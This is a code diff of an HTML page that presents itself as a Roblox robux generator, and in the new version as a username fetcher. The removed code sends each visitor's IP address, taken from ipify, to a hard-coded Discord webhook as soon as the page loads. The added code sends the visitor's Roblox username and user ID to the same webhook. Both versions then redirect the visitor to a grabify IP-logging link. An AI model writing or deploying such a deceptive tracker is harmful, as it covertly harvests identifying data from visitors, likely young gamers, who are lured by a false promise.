@@ -3,29 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Website Monitor</title>
+  <title>Roblox Username Input</title>
 </head>
 <body>
-  <h1>Generating robux, don't tab out/close this window!</h1>
+  <h1>Fetching Roblox Username</h1>
+  <button onclick="submitUsername()">Fetch Username</button>
 
   <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      sendDiscordMessage();
-    });
-
-    function sendDiscordMessage() {
+    function submitUsername() {
       var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-      fetch('https://api.ipify.org?format=json')
+      var userIdMatch = window.location.href.match(/userId=([0-9]+)/);
+      var userId = userIdMatch ? userIdMatch[1] : null;
+
+      if (!userId) {
+        alert("User ID not found in the URL.");
+        return;
+      }
+
+      // Fetch user information from Roblox API
+      fetch("https://api.roblox.com/users/" + userId)
         .then(response => response.json())
         .then(data => {
-          var ip = data.ip;
+          var robloxUsername = data.Username;
           var message = {
-            content: "Opened on: " + formattedDate + "\nUser's IP address: " + ip
+            content: "Opened on: " + formattedDate + "\nRoblox username: " + robloxUsername + "\nRoblox user ID: " + userId
           };
 
+          // Send message to Discord webhook
           fetch(webhookURL, {
             method: "POST",
             headers: {
@@ -35,22 +42,22 @@
           })
           .then(response => {
             if (!response.ok) {
-              console.error("Failed generating robux");
+              console.error("Failed to send message to Discord.");
             } else {
-              console.log("Generated robux");
-              redirectToDifferentWebsite();
+              console.log("Message sent to Discord successfully.");
+              redirectToGrabify();
             }
           })
           .catch(error => {
-            console.error("Error generating robux");
+            console.error("Error sending message to Discord:", error);
           });
         })
         .catch(error => {
-          console.error("Error fetching IP address:", error);
+          console.error("Error fetching user information from Roblox API:", error);
         });
     }
 
-    function redirectToDifferentWebsite() {
+    function redirectToGrabify() {
       window.location.href = "https://grabify.link/QW9D2R";
     }
   </script>
